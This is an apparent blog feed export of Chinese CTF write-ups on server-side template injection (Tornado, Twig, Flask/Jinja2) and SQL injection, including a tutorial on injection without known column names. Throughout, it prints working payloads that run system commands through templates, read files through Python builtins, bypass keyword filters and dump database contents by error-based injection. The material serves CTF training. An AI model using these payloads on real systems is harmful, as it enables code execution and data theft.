data-num=\"6\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'oppo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure>",
            "tags": [
                "python"
            ]
        },
        {
            "id": "http://example.com/2021/06/28/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/28/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "(ctfwp)buu中ssti模板注入",
            "date_published": "2021-06-28T12:51:13.874Z",
            "content_html": "<p>学习文章在前一篇</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"一-护网杯-2018easy_tornado\"><a class=\"anchor\" href=\"#一-护网杯-2018easy_tornado\">#</a> 一、[护网杯 2018] easy_tornado</h1>\n<p>打开题目，只有三个链接，如图，</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvSnBTcm5xY3U5UXpnUmsxLnBuZw==\">https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>依次点开</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png\" alt=\"1.2.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png\" alt=\"1.3.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png\" alt=\"1.4.png\"></p>\n<p>根据每个网址的链接和 flag 页面的内容可以推测，flag 应该是</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))\n</code></pre>\n<p>这种格式。</p>\n<p>所以本题的关键在 cookie_secret</p>\n<p>根据第二个链接内容，百度 render 可以发现，render () 是 tornado 里的函数，可以生成 html 模板。</p>\n<p>我们对网站进行尝试注入，看是否有注入点</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=&#123;&#123;7*7&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png\" alt=\"1.5.png\"></p>\n<p>发现网页报错，但明显还能尝试注入</p>\n<pre><code>error?msg=&#123;&#123;7*7&#125;&#125;    和        error?msg=&#123;&#123;7&#125;&#125;\n</code></pre>\n<p>发现当输入 7*7 时，返回 orz；输入 7 时，返回 7</p>\n<p>说明可以注入，但 * 可能被过滤</p>\n<p>因为存在注入点，所以我们需要寻找 cookie_secret 路径</p>\n<p>百度发现，其存在位置为 handler.settings</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png\" alt=\"1.6.png\"></p>\n<p>进行注入得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png\" alt=\"1.7.png\"></p>\n<pre><code>'cookie_secret': '3b278e82-468b-487a-8cd2-bcf53c8a19d0'&#125;\n</code></pre>\n<p>因为 md5 (filename)=md5 (/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1</p>\n<p>拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png\" alt=\"1.8.png\"></p>\n<p>最后输入 payload 进行查询，得到 flag</p>\n<pre><code>fllllllllllllag&amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png\" alt=\"1.9.png\"></p>\n<p 5d8b767c-07af-46ff-831d-30e9c7f4d32b>flag</p>\n<h1 id=\"二-bjdctf2020cookie-is-so-stable\"><a class=\"anchor\" href=\"#二-bjdctf2020cookie-is-so-stable\">#</a> 二、[BJDCTF2020] Cookie is so stable</h1>\n<p>打开题目，需要输入 id，随便输入后发现找不到 flag</p>\n<p>尝试注入</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZDR1ZWd0bm9aMjNNaXhzLnBuZw==\">https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvUFFoNFhsYlNLSE5FUk9JLnBuZw==\">https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZkhMb1dpQjhVMXNiWWszLnBuZw==\">https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png</span>&quot; alt=&quot;2.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>直接百度或根据上一篇文章的 payload 进行注入</p>\n<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;&#123;&#123;_self.env.getFilter(\"cat /flag\")&#125;&#125;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvU2ptaEZheG5Jd0RlUmZRLnBuZw==\">https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png</span>&quot; alt=&quot;2.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3>得 flag</p>\n<h1 id=\"三-gyctf2020flaskapp\"><a class=\"anchor\" href=\"#三-gyctf2020flaskapp\">#</a> 三、[GYCTF2020] FlaskApp</h1>\n<p>进去是这个页面，提示里没有信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvVUhrQWR3czVaclhmZ1FiLnBuZw==\">https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png</span>&quot; alt=&quot;3.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>随便尝试后，发现加密中可以注入代码，解密就能得到值：</p>\n<p>注入 14 得 e3s3Kzd9fQ== 翻译得 14</p>\n<p>但再注入 49 时，加密得 e3s3Kjd9fQ==</p>\n<p>再解密却得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png\" alt=\"3.2.png\"></p>\n<p>说明存在过滤</p>\n<p>尝试注入查找目录</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png\" alt=\"3.3.png\"></p>\n<p>发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 debug：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvYUVwWTVQU0RNbEtUd0hmLnBuZw==\">https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png</span>&quot; alt=&quot;3.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png\" alt=\"3.5.png\"></p>\n<p>找到了被过滤的字符</p>\n<p>拼接 os 和 import 构造 payload 寻找目录：</p>\n<pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png\" alt=\"3.6.png\"></p>\n<p>然后拼接 flag，读取文件：</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png\" alt=\"3.7.png\"></p>\n<p f8cc4e99-1ec3-49f2-b0be-b92686d4ff31>得到 flag</p>\n<h1 id=\"四-部分payload总结快速使用\"><a class=\"anchor\" href=\"#四-部分payload总结快速使用\">#</a> 四、部分 payload 总结，快速使用</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pby8yMDIxLzA2LzI4L2J1dSVFNCVCOCVBRCVFNyU5QSU4NCVFOSU4MyVBOCVFNSU4OCU4NnNzdGklRTglQTclQTMlRTklQTIlOTglRTglQkYlODclRTclQTglOEIv\">buu 中的部分 ssti 解题过程</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aTRvcjB1amkuZ2l0aHViLmlvLzIwMTkvMDEvMTUvZmxhc2slRTQlQjklOEJzc3RpJUU2JUE4JUExJUU2JTlEJUJGJUU2JUIzJUE4JUU1JTg1JUE1LyMlRTYlOTQlQkIlRTUlODclQkI=\">flask 之 ssti 模板注入</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz\">ssti 详解与例题以及绕过 payload 大全</span></p>\n",
            "tags": [
                "SSTI"
            ]
        },
        {
            "id": "http://example.com/2021/06/21/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/21/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/",
            "title": "ctfweb-sql无列名注入",
            "date_published": "2021-06-20T17:04:45.964Z",
            "content_html": "<p>谈谈 sql 注入无列名的情况</p>\n<p>以及该如何解题</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"无列名注入\"><a class=\"anchor\" href=\"#无列名注入\">#</a> <em><strong>无列名注入</strong></em></h1>\n<p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p>\n<p>在大多数 CTF 题目中， <code>information_schema</code>  库被过滤，称为无列名注入。</p>\n<h1 id=\"方法总结\"><a class=\"anchor\" href=\"#方法总结\">#</a> 方法总结</h1>\n<h3 id=\"基于union-select的无列名注入\"><a class=\"anchor\" href=\"#基于union-select的无列名注入\">#</a> <em>基于 union select 的无列名注入</em></h3>\n<hr>\n<p>一般 sql 查询：</p>\n<pre><code class=\"language-mysql\">select * from admin\n</code></pre>\n<p>假设得到列名 id,name,password，则使用联合查询 union：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 union select * from admin\n</code></pre>\n<p>则，数字会替换成列名（联合查询的特性，拼接表），所以 1,2,3 分别对应了 id，name，password</p>\n<pre><code class=\"language-mysql\">select b from (select 1,2,3 as b union select * from admin)a\n</code></pre>\n<p>（b 是 3 的重命名，a 是任意字符，用于命名）</p>\n<p>如果需要查多个列，用 concat () 函数即可。</p>\n<p>order by  用不了的情况下，可以用 group by 代替。</p>\n<h3 id=\"基于join的无列名注入的场景与方法\"><a class=\"anchor\" href=\"#基于join的无列名注入的场景与方法\">#</a> 基于 join 的无列名注入的场景与方法</h3>\n<hr>\n<p>join 后的列名是两个表列名加起来的，可能会产⽣相同的列名，如 id 和 name，使⽤别名时，表中不能出现同的字段名，这就跟 join 第⼀个特点相冲突，所以在 join 和别名同时使⽤时会导致报错。</p>\n<p>当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名。</p>\n<p><strong>首先获取第一个列名</strong></p>\n<pre><code class=\"language-mysql\">?id=-1' union all select * from (select * from users as a join users as b)as c\n</code></pre>\n<p>as 主要作用是起别名，就是把 users 表当做 a 表，常规来说 as 可以省略</p>\n<p><strong>获取接下来的列名</strong></p>\n<pre><code class=\"language-mysql\">?id=-1' union all select*from (select * from users as a join users as b using(id,username))a\n</code></pre>\n<h3 id=\"利用sysschema_auto_increment_columns-库来进行查询\"><a class=\"anchor\" href=\"#利用sysschema_auto_increment_columns-库来进行查询\">#</a> 利用 sys.schema_auto_increment_columns 库来进行查询</h3>\n<hr>\n<p>由于 performance_schema 过于发杂，所以 mysql 在 5.7 版本中新增了 sys schemma，基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据</p>\n<p><strong>mysql 默认是关闭 InnoDB 存储引擎的</strong></p>\n<p>注入中在 mysql 默认情况下就可以替代 information_schema 库的方法</p>\n<p><strong>payload:</strong></p>\n<p><em>获取库名：</em></p>\n<pre><code class=\"language-mysql\">schema_auto_increment_columns \n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+\n</code></pre>\n<pre><code class=\"language-mysql\">schema_table_statistics_with_buffer \n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+\n</code></pre>\n<p><strong>限制</strong>：一般要超级管理员才可以访问 sys</p>\n<p>​\t\t\tmysql ≥ 5.7 版本</p>\n<p><em>获取字段名：</em></p>\n<p>用 join 方法或者无列名注入。</p>\n<h3 id=\"利用-innodb-中的库进行查询\"><a class=\"anchor\" href=\"#利用-innodb-中的库进行查询\">#</a> 利用 innodb 中的库进行查询</h3>\n<hr>\n<p>innodb_table_stats 存放库名</p>\n<p>innodb_table_index 存放表名</p>\n<p>使用方法同正常 sql 注入：</p>\n<pre><code class=\"language-mysql\">select table_name from mysql.innodb_table_stats where database_name=库名xxx\n</code></pre>\n<p>** 限制：** 表引擎为 innodb</p>\n<p>​\t\t\tmysql &gt; 5.5</p>\n<h3 id=\"通过报错来达到无列名查询目的\"><a class=\"anchor\" href=\"#通过报错来达到无列名查询目的\">#</a> 通过报错来达到无列名查询目的</h3>\n<hr>\n<p>爆库名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where 1=abc();\n</code></pre>\n<p>爆表名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where Polygon(id);\nselect 1,2,3 from users where linestring(id);\n</code></pre>\n<p>爆列名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where (select*from (select*from users as a join users as b)as c);\n</code></pre>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where (select*from (select*from users as a join users as b using (id))as c);\n</code></pre>\n<p>前提是 users 表存在</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/06/20/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
            "url": "http://example.com/2021/06/20/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
            "title": "(ctfwp)sql注入极客大挑战",
            "date_published": "2021-06-20T09:25:52.913Z",
            "content_html": "<p>buuctf 极客大挑战系列    <em><strong>&lt;u&gt;sql 注入 &lt;/u&gt;</strong></em></p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"no1-easysql\"><a class=\"anchor\" href=\"#no1-easysql\">#</a> NO.1 EasySQL</h1>\n<p>题目如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvV3BZSzJFZmczQWRSam1RLnBuZw==\">https://i.loli.net/2021/06/21/WpYK2Efg3AdRjmQ.png</span>&quot; alt=&quot;easysql1&quot; style=&quot;zoom: 25%;&quot; /&gt;</p>\n<p>先尝试 万能密码</p>\n<pre><code>' or 1=1 #\n</code></pre>\n<p>结果一步得出答案...</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZGJ5RmZ1Tm0yendha3JSLnBuZw==\">https://i.loli.net/2021/06/21/dbyFfuNm2zwakrR.png</span>&quot; alt=&quot;easysql2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<h1 id=\"no2-lovesql\"><a class=\"anchor\" href=\"#no2-lovesql\">#</a> NO.2 LoveSQL</h1>\n<p>题目同上，没变化</p>\n<p>尝试万能密码，找不到有效信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbjQ4TFVHMWs2b3hWbFFaLnBuZw==\">https://i.loli.net/2021/06/21/n48LUG1k6oxVlQZ.png</span>&quot; alt=&quot;love1&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<hr>\n<p>尝试报错注入，寻找其他库 / 表：</p>\n<pre><code>1'and extractvalue(1,concat('~',database()))#\n</code></pre>\n<p>顺利得到库名  geek</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZHhpYVhGUXFCNmNvcFo4LnBuZw==\">https://i.loli.net/2021/06/21/dxiaXFQqB6copZ8.png</span>&quot; alt=&quot;love2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试爆表名：</p>\n<pre><code>1'and extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema=&quot;geek&quot;)))#\n</code></pre>\n<p>显示 结果超过一行（<em>Subquery returns more than 1 row</em>），添加 group_connat ()  函数解决。</p>\n<p>所以，输入</p>\n<pre><code>1'and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=&quot;geek&quot;)))#\n</code></pre>\n<p>得到表名 geekuser,l0ve1ysq1</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvb3Z1ZVB0YnNjR2sxNThqLnBuZw==\">https://i.loli.net/2021/06/21/ovuePtbscGk158j.png</span>&quot; alt=&quot;love3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试查表名，目测是第二个</p>\n<pre><code>1'and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;)))#\n</code></pre>\n<p>得到列名 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbXZOWVFNR29MT0E1cDFaLnBuZw==\">https://i.loli.net/2021/06/21/mvNYQMGoLOA5p1Z.png</span>&quot; alt=&quot;love4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试获取信息</p>\n<pre><code>1'and extractvalue(1,concat('~',(select concat_ws('~',id,username,password) from l0ve1ysq1 where id=1)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQWd3Yk9WYW01Y0I5RkwyLnBuZw==\">https://i.loli.net/2021/06/21/AgwbOVam5cB9FL2.png</span>&quot; alt=&quot;love5&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>又查了几个 id 全是废话，直接爆破吧</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvVmgyakdBMWxYOEJiY3JhLnBuZw==\">https://i.loli.net/2021/06/21/Vh2jGA1lX8Bbcra.png</span>&quot; alt=&quot;love6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvWUVENkxiNzhlcW5sazNQLnBuZw==\">https://i.loli.net/2021/06/21/YED6Lb78eqnlk3P.png</span>&quot; alt=&quot;love7&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>爆破得出 id=16 处有 flag 没显示全</p>\n<p>前半段</p>\n<pre><code>1'and extractvalue(1,concat('~',(select concat_ws('~',id,username,password) from l0ve1ysq1 where id=16)))#\n</code></pre>\n<p>后半段</p>\n<pre><code>1'and extractvalue(1,concat('~',(select substr(password,15,30) from l0ve1ysq1 where id=16)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUlhoZlUycjhkN0dTNUNKLnBuZw==\">https://i.loli.net/2021/06/21/RXhfU2r8d7GS5CJ.png</span>&quot; alt=&quot;love8&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZkU2OEZ2WVhuUndWSE91LnBuZw==\">https://i.loli.net/2021/06/21/fE68FvYXnRwVHOu.png</span>&quot; alt=&quot;love9&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p fd752c8f-8f92-4b6f-93fa-0f99791741f0>得  flag</p>\n<h1 id=\"no3-babysql\"><a class=\"anchor\" href=\"#no3-babysql\">#</a> NO.3 BabySQL</h1>\n<p>老方法 万能密码走一遍，果然不行～</p>\n<p>选择做 FUZZ 模糊测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNVFjTzRDWkduYjM4MjdyLnBuZw==\">https://i.loli.net/2021/06/21/5QcO4CZGnb3827r.png</span>&quot; alt=&quot;baby1&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>不难发现 len 726 长度都被过滤成空 ''  所以显示没有输入，</p>\n<p>而 len 751 都没有被过滤，</p>\n<p>这种过滤比较简单，所以直接考虑 <strong>双写绕过</strong>。</p>\n<p>通过报错注入</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,database()))#\n</code></pre>\n<p>得到库名 geek</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvRXdTM296VEY4Nk1DUGxYLnBuZw==\">https://i.loli.net/2021/06/21/EwS3ozTF86MCPlX.png</span>&quot; alt=&quot;baby2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>继续爆表名</p>\n<pre><code> **1'oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere table_schema=&quot;geek&quot;)))#**     \n</code></pre>\n<p>得到表名 b4bsql,geekuser</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUVJBdEwxQjlZNEhUemVDLnBuZw==\">https://i.loli.net/2021/06/21/QRAtL1B9Y4HTzeC.png</span>&quot; alt=&quot;baby3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>继续爆列名</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&quot;b4bsql&quot;)))#\n</code></pre>\n<p>得到列名 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaUpybmM4czFaQzlEbU9FLnBuZw==\">https://i.loli.net/2021/06/21/iJrnc8s1ZC9DmOE.png</span>&quot; alt=&quot;baby4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查询数据</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect concat_ws(0x7e,id,username,passwoorrd)frfromom b4bsql whwhereere id=1)))#\n</code></pre>\n<p>同上，又是一堆废话，直接爆破，得到 id=8 时有 flag</p>\n<p>剩下步骤同上一题</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaG10WHY3anFuSFdaRXlELnBuZw==\">https://i.loli.net/2021/06/21/hmtXv7jqnHWZEyD.png</span>&quot; alt=&quot;baby5&quot; style=&quot;zoom:33%;&quot; /&gt;</p>\n<p>后半部分</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect subsubstrstr(passwoorrd,15,30)frfromom b4bsql whwhereere id=8)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEva3dUaDRFOUlvY1ZRbmpxLnBuZw==\">https://i.loli.net/2021/06/21/kwTh4E9IocVQnjq.png</span>&quot; alt=&quot;baby6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p 50ba0844-d76f-4a9a-892f-bc7694528c7e>得 flag</p>\n<h1 id=\"no4-hardsql\"><a class=\"anchor\" href=\"#no4-hardsql\">#</a> NO.4 HardSQL</h1>\n<p>万能密码走一下，失败</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvMXVqZUdjRno0bnJ2OWw4LnBuZw==\">https://i.loli.net/2021/06/21/1ujeGcFz4nrv9l8.png</span>&quot; alt=&quot;hard1&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>直接做 FUZZ 模糊测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvYU9XSXRmeDZpWFBLQkxrLnBuZw==\">https://i.loli.net/2021/06/21/aOWItfx6iXPKBLk.png</span>&quot; alt=&quot;hard2&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>如图，len 736 都被屏蔽了</p>\n<p>len 751 没被屏蔽，另外空格在实际输入中也被屏蔽了，所以空格用括号代替。</p>\n<p>尝试报错注入 **1'or (extractvalue (1,concat (0x7e,database ())))#</p>\n<p>顺利得到库名  geek</p>\n<p>图同上，略</p>\n<p>尝试爆表名</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where((table_schema)like(&quot;geek&quot;))))))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQ1FpRUx1TXo3anRGMnNvLnBuZw==\">https://i.loli.net/2021/06/21/CQiELuMz7jtF2so.png</span>&quot; alt=&quot;hard3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>得到表名 H4rDsq1</p>\n<p>尝试爆列名</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&quot;H4rDsq1&quot;))))))#\n</code></pre>\n<p>得 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaHROYVVCeFlSQ3dsYmpBLnBuZw==\">https://i.loli.net/2021/06/21/htNaUBxYRCwlbjA.png</span>&quot; alt=&quot;hard4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查找信息</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where((id)like(1))))))#\n</code></pre>\n<p>得 flag 前半段</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvdWQ4TDVBdHY3VnlOV0RyLnBuZw==\">https://i.loli.net/2021/06/21/ud8L5Atv7VyNWDr.png</span>&quot; alt=&quot;hard5&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查后半段</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)where((id)like(1))))))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" 